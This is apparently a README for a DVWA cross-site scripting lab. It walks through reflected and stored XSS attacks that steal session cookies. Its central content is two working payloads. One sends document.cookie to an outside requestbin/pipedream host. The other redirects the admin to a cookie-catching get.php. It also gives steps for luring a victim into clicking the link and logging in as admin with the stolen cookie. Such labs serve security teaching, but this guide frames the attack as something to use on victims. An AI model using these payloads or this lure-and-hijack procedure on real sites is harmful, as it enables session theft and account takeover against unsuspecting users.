# Cross-site-Scripting_XSS
## 1. Installation
- Move the directory "dvwa" and "mywebsite" to the xampp installation directory
For example:
E:\ xampp\htdocs\dvwa
E:\xampp\htdocs\mywebsite

- Upload the file "dvwa.sql" to: http://localhost/phpmyadmin/

## 2. Deploy and attack
### - Access url: http://localhost/dvwa/

### - XSS - Reflected
+ Identify website with XSS reflected error?
+ After determining that there are errors XSS Reflected. Send the link to the user. (The ability to seduce the victim depends on each person, assuming we can seduce the victim to click on the link)
+ Access to https://requestbin.com/ to Create request bin (In this example, my request bin is https://requestbin.com/r/en3xwxviv17aq)
+ Insert the script: <script>document.write('<IMG SRC=\"https://en3xwxviv17aq.x.pipedream.net?cookie='+document.cookie+'\">Hello</IMG>');</script>
+ View the cookie you just got and exploit that cookie
(Go to https://requestbin.com/r/en3xwxviv17aq to exploit the cookies you just grabbed)

### - XSS - Stored
+ Create 2 files: get.php (get cookie) and cookie.txt (empty to save her
+ Upload to site message will save to guestbook in database (dvwa.sql)
+ Login as customer to insert code to get admin cookie: <script>window.location="http://localhost/mywebsite/get.php?cookie="+document.cookie;</script>

+ the link to the get.php file contains the code to get the cookie you just created
+ Now switch to the admin account
+ When the admin accesses, the admin will successfully self-direct and get the admin cookie
+ Use add-on on your browser to access when you know the admin cookie
+ Login as admin successfully (No need to know password)

# Note: To use cookie exploited from the victim, each browser must install the cookie tool (add-on) depending on the extendtions of each browser.
